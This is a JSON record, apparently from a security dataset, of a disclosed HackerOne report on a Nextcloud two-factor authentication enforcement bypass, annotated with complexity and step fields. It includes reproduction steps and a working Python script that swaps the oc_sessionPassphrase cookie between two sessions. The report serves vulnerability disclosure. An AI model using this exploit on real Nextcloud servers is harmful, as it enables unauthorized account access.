@@ -1,0 +1,38 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "abdullah-a ",
+  "title": "Two-factor authentication enforcement bypass",
+  "content": "\nthe attacker could bypass the two-factor authentication enforcement\n[ Steps to reproduce ]\nLogin with an Administrator account.\nClick on your administrator profile icon.\nUsers -> Add group -> group name: Enforcement.\nNew User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.\nClick on your administrator profile icon.\nSettings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.\nSave changes.\nLogout.\nLogin with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.\nLogin with Username: Bypass and Password: NextCloudEnforcement with another session.\nreplace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.\nthen you have bypassed the two factor authentication enforcement.\n[Code]\npython script just change the domain to your domain and save as bypass.py\nCode 1.15 KiB\n1#!/usr/bin/python3\n2# python3 -m pip install requests beautifulsoup4\n3# python3 bypass.py\n4from requests import Session\n5from bs4 import BeautifulSoup\n6\n7class NextCloud(object):\n8    def __init__(self, baseURL):\n9        self.session = Session()\n10        self.baseURL = baseURL\n11\n12    def login(self, data):\n13        response = self.session.get(f'{self.baseURL}/login')\n14        soup = BeautifulSoup(response.text, 'html.parser')\n15        data.update({\n16            'requesttoken': soup.find('head')['data-requesttoken']\n17        })\n18        self.session.post(f'{self.baseURL}/login', data = data)\n19    \n20    def getCookies(self):\n21        return self.session.cookies.get_dict()\n22\n23if __name__ == '__main__':\n24    baseURL = 'http://nextcloud.diefunction.local'\n25    data = {\n26        'user': 'bypass',\n27        'password': 'NextCloudEnforcement'\n28    }\n29    firstSession = NextCloud(baseURL)\n30    secondSession = NextCloud(baseURL)\n31    firstSession.login(data)\n32    secondSession.login(data)\n33    cookies = firstSession.getCookies()\n34    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']\n35    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement\nchange the browser cookies to the script output cookies\n[ why its worked ]\nI tried to understand why it's worked but I didn't found any reason for that\nhttps://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php\n[Discovered by]\nAbdullah Alharbi @Eng_Abdullahx0\nRayan Althobaiti @Diefunction\nNote: if this is an eligible bug please provide a CVE.\nImpact\nthe attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication\n\n",
+  "severity": [
+    7.3,
+    null
+  ],
+  "bounty": 750,
+  "weaknesses": [
+    "None"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1627754700,
+  "report_url": "https://hackerone.com/reports/1050244",
+  "vuln_category": "WEB_APP",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Login with an Administrator account and create a new group 'Enforcement' and add a new user 'Bypass' to this group."
+    ],
+    [
+      2,
+      "Enable two-factor authentication enforcement for the 'Enforcement' group. Logout and login with the 'Bypass' user. Use a Python script to swap session tokens between two sessions to bypass 2FA enforcement."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to bypass two-factor authentication enforcement by manipulating session tokens between two active sessions, gaining unauthorized access to the user dashboard.",
+  "reason": "The attack involves understanding session management and token manipulation, but the steps are straightforward once the session token swapping is identified. The interaction between session tokens and 2FA enforcement is non-obvious but not highly complex.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
